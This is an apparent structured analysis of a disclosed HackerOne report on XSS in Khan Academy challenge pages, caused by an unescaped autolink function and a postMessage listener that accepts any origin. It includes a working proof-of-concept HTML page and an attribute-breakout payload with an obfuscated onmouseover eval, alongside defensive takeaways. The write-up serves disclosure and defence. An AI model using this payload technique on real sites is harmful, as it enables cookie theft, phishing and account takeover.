# XSS via Insecure PostMessage Handling and Autolink Function

## Metadata
- **Source:** HackerOne
- **Report:** 1758132 | https://hackerone.com/reports/1758132
- **Submitted:** 2022-11-01
- **Reporter:** moom825
- **Program:** Khan Academy
- **Bounty:** Not specified in writeup
- **Severity:** High
- **Vuln:** Cross-Site Scripting (XSS), Insecure postMessage Handler, Improper Input Validation, Broken CORS/Origin Verification
- **CVEs:** None
- **Category:** web-api

## Summary
Khan Academy's challenge pages contain an insecure autolink function that incorrectly parses URLs in postMessage events, allowing injection of HTML attributes and event handlers. Combined with loose origin validation on the postMessage listener, attackers can craft malicious payloads from any origin to execute arbitrary JavaScript in the context of Khan Academy pages.

## Attack scenario
1. Attacker creates a malicious webpage hosting a postMessage exploit script
2. Attacker tricks a Khan Academy user (student or teacher) into visiting the malicious site
3. Malicious script opens a Khan Academy challenge page in a new window
4. Script waits for page to fully load, then sends crafted postMessage with XSS payload embedded in 'msg' field
5. Khan Academy's message handler accepts the postMessage due to origin wildcard validation ('*')
6. Autolink function processes the payload, failing to properly escape the URL string and treating injected attributes as valid HTML
7. Resulting anchor tag contains event handlers like onmouseover that execute attacker's code when triggered
8. Attacker gains ability to steal cookies, impersonate user, modify page content, or perform account takeover

## Root cause
Two compounding vulnerabilities: (1) The autolink regex and replacement function concatenates unsanitized user input directly into HTML attribute values without proper escaping, allowing quote-breakout attacks; (2) The postMessage event listener uses origin='*' instead of validating against specific trusted origins, allowing any webpage to send messages.

## Attacker mindset
An attacker identified that Khan Academy processes user-generated content (test results, messages) through an insecure string replacement function that treats regex-matched URLs as safe to inject directly into HTML. The attacker realized that by crafting a URL-like string with quote characters and HTML attributes, they could break out of the href attribute and inject arbitrary attributes with event handlers. They further noticed the postMessage handler accepts all origins, eliminating the need for same-origin access.

## Defensive takeaways
- Always HTML-encode/escape user input before inserting into HTML attributes, regardless of source
- Use textContent or createElement() instead of string concatenation for building DOM elements
- Validate postMessage origins against an explicit whitelist, never use '*' for sensitive operations
- Implement Content Security Policy (CSP) to restrict inline script execution and script sources
- Use sandboxed iframes for untrusted content with appropriate sandbox restrictions
- Implement output encoding context-aware (URL encoding for URLs, HTML encoding for HTML, JS encoding for JavaScript)
- Use a robust HTML sanitization library (DOMPurify, Sanitize-html) instead of regex-based solutions for user-supplied content
- Validate and sanitize JSON payloads on the server-side before processing or storing
- Consider using a security linter to detect dangerous patterns like innerHTML with string concatenation

## Variant hunting
Search for other postMessage handlers in Khan Academy codebase accepting wildcard origins; audit other string-replacement functions used for text processing; look for other challenge/interactive features that might accept postMessage data; examine any user-generated content rendering systems for similar concatenation patterns; check for similar autolink or URL-processing functions in other components or libraries used by Khan Academy

## MITRE ATT&CK
- T1190
- T1539
- T1566
- T1598
- T1056

## Notes
The writeup includes a practical proof-of-concept that demonstrates the vulnerability end-to-end. The String.fromCharCode obfuscation of 'alert("pwnd!")' in the payload shows attacker awareness of potential detection. The attack's effectiveness against teachers with email notification systems could enable secondary attacks like account takeover or class manipulation. The vulnerability is particularly dangerous because it requires no special user interaction beyond visiting a malicious site - the postMessage is sent automatically.

## Full report
<details><summary>Expand</summary>

Due to Insecure handling of create link tags (a tags) in a function called `autolink` found in `7Bmt.af733e428f9f986dfc96.js`
```js
e = n.autolink(e, !0));
        const n = function() {
            const e = /\b(?:(?:https?:\/\/|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}\/)(?:[^\s()<>&]+|&amp;|\((?:[^\s()<>]|(?:\([^\s()<>]+\)))*\))+(?:\((?:[^\s()<>]|(?:\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’&]))/gi;
            return {
                autolink: function(t, r) {
                    return t.replace(e, (function(e) {
                        /^https?:\/\//.test(e) || (e = "http://" + e);
                        return "<a " + (r ? 'rel="nofollow"' : "") + ' href="' + e + '">' + e + "</a>"
                    }
                    ))
                }
            }
        }();
```
which is ran in the challenges (ex: https://www.khanacademy.org/computing/computer-programming/programming/resizing-with-variables/pc/challenge-brown-bear-eyes). A specially crafted postmessage can abuse this.
```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>New webpage</title>
    </head>
    <body>
        <script>
        function main()
{
	window['test']=window.open("https://www.khanacademy.org/computing/computer-programming/programming/interactive-programs/pc/challenge-mouse-movement-mania");
	const pwntimer = setTimeout(pwn, 3000);	
}
function pwn(){window['test'].postMessage('{"results":{"timestamp":'+Date.now()+',"code":"","errors":[],"assertions":[],"warnings":[],"tests":[{"name":"","state":"pass","results":[{"type":"assertion","msg":"http://#/\\"style=\\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\\"onmouseover=\\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\\"","state":"pass","expected":"","meta":{"structure":"function() {pwned!}"}}]}]}}',"*");clearTimeout(pwntimer)};
        </script>
        <button onclick="main();">press to pwn</button>
    </body>
</html>
```
also due to insecure host checking in the `message` event, the mentioned html code above can be run from any webpage.

The payload which the function `autolink` is insecurely creating the tag can look like this
`http://#/"style="width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;"onmouseover="eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))"` the malicious link will be set incorrectly and create extra attributes (in this case style and onmouseover)


the parsed json payload:
```json
{
   "results":{
      "timestamp":"",
      "code":"",
      "errors":[
         
      ],
      "assertions":[
         
      ],
      "warnings":[
         
      ],
      "tests":[
         {
            "name":"",
            "state":"pass",
            "results":[
               {
                  "type":"assertion",
                  "msg":"http://#/\"style=\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\"onmouseover=\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\"",
                  "state":"pass",
                  "expected":"",
                  "meta":{
                     "structure":"function() {pwned!}"
                  }
               }
            ]
         }
      ]
   }
}
```

## Impact

This attack could be steal user data (cookies, profile, etc) which in turn can be used to manipulate the user account, if it is a teacher who gets targeted, it can cause havoc with the email ("106 assignments have been assigned") as well as leak student private info. This attack could also be used to create a phishing page with the domain `khanacademy.org` by modifying the page to display a login box (stealing the users email and password).

</details>

---
*Analysed by Claude on 2026-05-12*
